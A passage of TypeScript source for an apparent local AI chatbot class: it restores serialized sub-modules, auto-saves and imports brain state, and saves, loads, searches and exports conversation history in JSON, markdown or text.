        try { brain.tradingEngine = TradingEngine.deserialize(advanced.tradingEngine) } catch { /* ignore corrupted state */ }
      }
      if (advanced.marketAnalyzer) {
        try { brain.marketAnalyzer = MarketAnalyzer.deserialize(advanced.marketAnalyzer) } catch { /* ignore corrupted state */ }
      }
      if (advanced.portfolioOptimizer) {
        try { brain.portfolioOptimizer = PortfolioOptimizer.deserialize(advanced.portfolioOptimizer) } catch { /* ignore corrupted state */ }
      }
      if (advanced.strategyEngine) {
        try { brain.strategyEngine = StrategyEngine.deserialize(advanced.strategyEngine) } catch { /* ignore corrupted state */ }
      }
      if (advanced.decisionEngine) {
        try { brain.decisionEngine = DecisionEngine.deserialize(advanced.decisionEngine) } catch { /* ignore corrupted state */ }
      }
      if (advanced.knowledgeSynthesizer) {
        try { brain.knowledgeSynthesizer = KnowledgeSynthesizer.deserialize(advanced.knowledgeSynthesizer) } catch { /* ignore corrupted state */ }
      }
      if (advanced.economicAnalyzer) {
        try { brain.economicAnalyzer = EconomicAnalyzer.deserialize(advanced.economicAnalyzer) } catch { /* ignore corrupted state */ }
      }
      if (advanced.securityTrainer) {
        try { brain.securityTrainer = SecurityTrainer.deserialize(advanced.securityTrainer) } catch { /* ignore corrupted state */ }
      }
      if (advanced.temporalReasoner) {
        try { brain.temporalReasoner = TemporalReasoner.deserialize(advanced.temporalReasoner) } catch { /* ignore corrupted state */ }
      }
      if (advanced.normalizationEngine) {
        try { brain.normalizationEngine = NormalizationEngine.deserialize(advanced.normalizationEngine) } catch { /* ignore corrupted state */ }
      }
      if (advanced.bayesianNetwork) {
        try { brain.bayesianNetwork = BayesianNetwork.deserialize(advanced.bayesianNetwork) } catch { /* ignore corrupted state */ }
      }
      if (advanced.ontologyManager) {
        try { brain.ontologyManager = OntologyManager.deserialize(advanced.ontologyManager) } catch { /* ignore corrupted state */ }
      }
      if (advanced.dialogueManager) {
        try { brain.dialogueManager = DialogueManager.deserialize(advanced.dialogueManager) } catch { /* ignore corrupted state */ }
      }
      if (advanced.argumentAnalyzer) {
        try { brain.argumentAnalyzer = ArgumentAnalyzer.deserialize(advanced.argumentAnalyzer) } catch { /* ignore corrupted state */ }
      }
      if (advanced.narrativeEngine) {
        try { brain.narrativeEngine = NarrativeEngine.deserialize(advanced.narrativeEngine) } catch { /* ignore corrupted state */ }
      }
      if (advanced.vulnerabilityScanner) {
        try { brain.vulnerabilityScanner = VulnerabilityScanner.deserialize(advanced.vulnerabilityScanner) } catch { /* ignore corrupted state */ }
      }
      if (advanced.threatModeler) {
        try { brain.threatModeler = ThreatModeler.deserialize(advanced.threatModeler) } catch { /* ignore corrupted state */ }
      }
      if (advanced.exploitAnalyzer) {
        try { brain.exploitAnalyzer = ExploitAnalyzer.deserialize(advanced.exploitAnalyzer) } catch { /* ignore corrupted state */ }
      }
      if (advanced.networkForensics) {
        try { brain.networkForensics = NetworkForensics.deserialize(advanced.networkForensics) } catch { /* ignore corrupted state */ }
      }
      if (advanced.patternRecognizer) {
        try { brain.patternRecognizer = PatternRecognizer.deserialize(advanced.patternRecognizer) } catch { /* ignore corrupted state */ }
      }
      if (advanced.conceptMapper) {
        try { brain.conceptMapper = ConceptMapper.deserialize(advanced.conceptMapper) } catch { /* ignore corrupted state */ }
      }
      if (advanced.inferenceEngine) {
        try { brain.inferenceEngine = InferenceEngine.deserialize(advanced.inferenceEngine) } catch { /* ignore corrupted state */ }
      }
      if (advanced.sentimentAnalyzer) {
        try { brain.sentimentAnalyzer = SentimentAnalyzer.deserialize(advanced.sentimentAnalyzer) } catch { /* ignore corrupted state */ }
      }
    }

    return brain
  }

  // ── Auto-Save / Auto-Load (v2) ──

  /** Auto-save brain state to configured path. Uses atomic write for safety. */
  private autoSave(): void {
    if (!this.config.autoSavePath) return

    try {
      const dir = path.dirname(this.config.autoSavePath)
      if (!fs.existsSync(dir)) {
        fs.mkdirSync(dir, { recursive: true })
      }

      const json = this.serializeBrain()
      const tempPath = this.config.autoSavePath + '.tmp'
      fs.writeFileSync(tempPath, json, 'utf-8')
      fs.renameSync(tempPath, this.config.autoSavePath)
      this.learningsSinceLastSave = 0
    } catch {
      // Silently fail — auto-save is best-effort
    }
  }

  /** Auto-load brain state from configured path. */
  private autoLoad(): void {
    if (!this.config.autoSavePath) return

    try {
      if (!fs.existsSync(this.config.autoSavePath)) return

      const json = fs.readFileSync(this.config.autoSavePath, 'utf-8')
      const state = JSON.parse(json) as LocalBrainState

      this.learnedPatterns = state.learnedPatterns.map(p => ({
        ...p,
        priority: p.priority ?? 'learned',
      }))
      this.stats = { ...this.stats, ...state.stats }

      // Restore learned knowledge entries
      for (const entry of state.knowledgeAdditions) {
        if (!this.knowledgeBase.some(e => e.id === entry.id)) {
          this.knowledgeBase.push(entry)
        }
      }
    } catch {
      // Silently fail — auto-load is best-effort
    }
  }

  /**
   * Export brain state to a specific file path.
   * Useful for backup, transfer, or sharing learned knowledge.
   */
  exportBrain(filePath: string): void {
    try {
      const dir = path.dirname(filePath)
      if (!fs.existsSync(dir)) {
        fs.mkdirSync(dir, { recursive: true })
      }
      fs.writeFileSync(filePath, this.serializeBrain(), 'utf-8')
    } catch (e) {
      throw new Error(
        `Failed to export brain to ${filePath}: ${e instanceof Error ? e.message : String(e)}`,
      )
    }
  }

  /**
   * Import brain state from a file path.
   * Merges learned patterns and knowledge with existing state.
   */
  importBrain(filePath: string): void {
    const json = fs.readFileSync(filePath, 'utf-8')
    const state = JSON.parse(json) as LocalBrainState

    // Merge learned patterns (avoid duplicates by input pattern)
    for (const pattern of state.learnedPatterns) {
      const existing = this.learnedPatterns.find(
        p => p.inputPattern.toLowerCase() === pattern.inputPattern.toLowerCase()
      )
      if (existing) {
        // Merge: keep higher confidence/reinforcements
        if (pattern.confidence > existing.confidence) {
          existing.confidence = pattern.confidence
          existing.response = pattern.response
        }
        existing.reinforcements += pattern.reinforcements
      } else {
        this.learnedPatterns.push({
          ...pattern,
          priority: pattern.priority ?? 'learned',
        })
      }
    }

    // Merge knowledge additions
    for (const entry of state.knowledgeAdditions) {
      if (!this.knowledgeBase.some(e => e.id === entry.id)) {
        this.knowledgeBase.push(entry)
      }
    }
  }

  /** Force save current state (for manual persistence). */
  save(): void {
    this.autoSave()
  }

  // ══════════════════════════════════════════════════════════════════════════════
  // §  ENHANCED CHAT — Conversation persistence, search & export
  // ══════════════════════════════════════════════════════════════════════════════

  /**
   * Save conversation history to a file for persistence and crash recovery.
   * Conversations are saved as JSON and can be restored with `loadConversation()`.
   */
  saveConversation(filePath: string): void {
    try {
      const dir = path.dirname(filePath)
      if (!fs.existsSync(dir)) {
        fs.mkdirSync(dir, { recursive: true })
      }
      const data = JSON.stringify({
        version: 1,
        savedAt: new Date().toISOString(),
        config: { model: this.config.model },
        history: this.conversationHistory,
        summary: this.conversationSummarizer?.getSummary() ?? null,
        stats: this.stats,
      }, null, 2)
      fs.writeFileSync(filePath, data, 'utf-8')
    } catch (e) {
      throw new Error(
        `Failed to save conversation to ${filePath}: ${e instanceof Error ? e.message : String(e)}`,
      )
    }
  }

  /**
   * Load a previously saved conversation history, restoring context.
   * Merges with or replaces the current conversation based on the `replace` option.
   */
  loadConversation(filePath: string, options?: { replace?: boolean }): { restored: number } {
    try {
      const json = fs.readFileSync(filePath, 'utf-8')
      const data = JSON.parse(json) as {
        version: number
        history: ApiMessage[]
        summary?: ReturnType<ConversationSummarizer['getSummary']> | null
      }

      if (!Array.isArray(data.history)) {
        throw new Error('Invalid conversation file: missing history array')
      }

      if (options?.replace) {
        this.conversationHistory = data.history
      } else {
        this.conversationHistory.push(...data.history)
      }

      // Re-feed the summarizer if available
      if (this.conversationSummarizer && data.history.length > 0) {
        for (const msg of data.history) {
          this.conversationSummarizer.addTurn(msg.role, typeof msg.content === 'string' ? msg.content : '')
        }
      }

      // Re-feed context manager
      if (this.contextManager && data.history.length > 0) {
        for (const msg of data.history.slice(-10)) {
          this.contextManager.addTurn({
            role: msg.role,
            content: typeof msg.content === 'string' ? msg.content : '',
            timestamp: Date.now(),
          })
        }
      }

      return { restored: data.history.length }
    } catch (e) {
      throw new Error(
        `Failed to load conversation from ${filePath}: ${e instanceof Error ? e.message : String(e)}`,
      )
    }
  }

  /**
   * Search through conversation history for messages matching a query.
   * Returns matching messages with their index and relevance score.
   */
  searchConversation(query: string, options?: {
    role?: 'user' | 'assistant'
    maxResults?: number
    caseSensitive?: boolean
  }): Array<{
    index: number
    role: string
    content: string
    score: number
    preview: string
  }> {
    const maxResults = options?.maxResults ?? 10
    const queryLower = options?.caseSensitive ? query : query.toLowerCase()
    const queryWords = queryLower.split(/\s+/).filter(w => w.length > 2)

    const results: Array<{
      index: number
      role: string
      content: string
      score: number
      preview: string
    }> = []

    for (let i = 0; i < this.conversationHistory.length; i++) {
      const msg = this.conversationHistory[i]!
      if (options?.role && msg.role !== options.role) continue

      const content = typeof msg.content === 'string' ? msg.content : ''
      const contentLower = options?.caseSensitive ? content : content.toLowerCase()

      // Calculate relevance score based on keyword overlap
      let score = 0
      for (const word of queryWords) {
        if (contentLower.includes(word)) {
          score += 1
        }
      }
      // Exact phrase match bonus
      if (contentLower.includes(queryLower)) {
        score += queryWords.length
      }

      if (score > 0) {
        // Build a preview (snippet around first match)
        const matchIdx = contentLower.indexOf(queryLower.split(/\s+/)[0] ?? queryLower)
        const previewStart = Math.max(0, matchIdx - 40)
        const previewEnd = Math.min(content.length, matchIdx + 120)
        const preview = (previewStart > 0 ? '...' : '') +
          content.slice(previewStart, previewEnd).trim() +
          (previewEnd < content.length ? '...' : '')

        results.push({
          index: i,
          role: msg.role,
          content,
          score: score / queryWords.length,
          preview,
        })
      }
    }

    // Sort by score descending
    results.sort((a, b) => b.score - a.score)
    return results.slice(0, maxResults)
  }

  /**
   * Export conversation history in a readable format.
   * Supports 'markdown', 'json', and 'text' formats.
   */
  exportConversation(format: 'markdown' | 'json' | 'text' = 'markdown'): string {
    const history = this.conversationHistory
    const summary = this.conversationSummarizer?.getSummary()

    if (format === 'json') {
      return JSON.stringify({
        exportedAt: new Date().toISOString(),
        messageCount: history.length,
        summary: summary ?? null,
        messages: history.map((msg, i) => ({
          index: i,
          role: msg.role,
          content: typeof msg.content === 'string' ? msg.content : '',
        })),
      }, null, 2)
    }

    if (format === 'text') {
      return history.map(msg => {
        const role = msg.role === 'user' ? 'You' : 'AI'
        const content = typeof msg.content === 'string' ? msg.content : ''
        return `[${role}]: ${content}`
      }).join('\n\n')
    }

    // Default: markdown
    let md = `# Conversation Export\n\n`
    md += `**Messages:** ${history.length}\n`
    md += `**Exported:** ${new Date().toISOString()}\n\n`

    if (summary) {
      if (summary.topics.length > 0) {
        md += `**Topics:** ${summary.topics.join(', ')}\n`
      }
      if (summary.decisions.length > 0) {
        md += `\n## Decisions\n${summary.decisions.map(d => `- ${d}`).join('\n')}\n`
      }
      if (summary.openQuestions.length > 0) {
        md += `\n## Open Questions\n${summary.openQuestions.map(q => `- ${q}`).join('\n')}\n`
      }
    }

    md += `\n---\n\n## Messages\n\n`

    for (const msg of history) {
      const role = msg.role === 'user' ? '👤 **You**' : '🤖 **AI**'
      const content = typeof msg.content === 'string' ? msg.content : ''
      md += `### ${role}\n\n${content}\n\n---\n\n`
    }

    return md
  }

  /**
   * Get conversation statistics — useful for monitoring chat health.
   */
  getConversationStats(): {
    totalMessages: number
    userMessages: number
    assistantMessages: number
    averageResponseLength: number
    topics: string[]
    openQuestions: string[]
    decisions: string[]
  } {
    const userMsgs = this.conversationHistory.filter(m => m.role === 'user')
    const assistantMsgs = this.conversationHistory.filter(m => m.role === 'assistant')
    const avgLen = assistantMsgs.length > 0
      ? assistantMsgs.reduce((sum, m) => sum + (typeof m.content === 'string' ? m.content.length : 0), 0) / assistantMsgs.length
      : 0

    const summary = this.conversationSummarizer?.getSummary()

    return {
      totalMessages: this.conversationHistory.length,
      userMessages: userMsgs.length,
      assistantMessages: assistantMsgs.length,
      averageResponseLength: Math.round(avgLen),
      topics: summary?.topics ?? [],
      openQuestions: summary?.openQuestions ?? [],
      decisions: summary?.decisions ?? [],
    }
  }

  /**
   * Clear conversation history, optionally keeping the last N messages for context.
   */
  clearConversation(keepLast?: number): { cleared: number } {
    const total = this.conversationHistory.length
    if (keepLast && keepLast > 0) {
      this.conversationHistory = this.conversationHistory.slice(-keepLast)
    } else {
      this.conversationHistory = []
    }
    return { cleared: total - this.conversationHistory.length }
  }
}
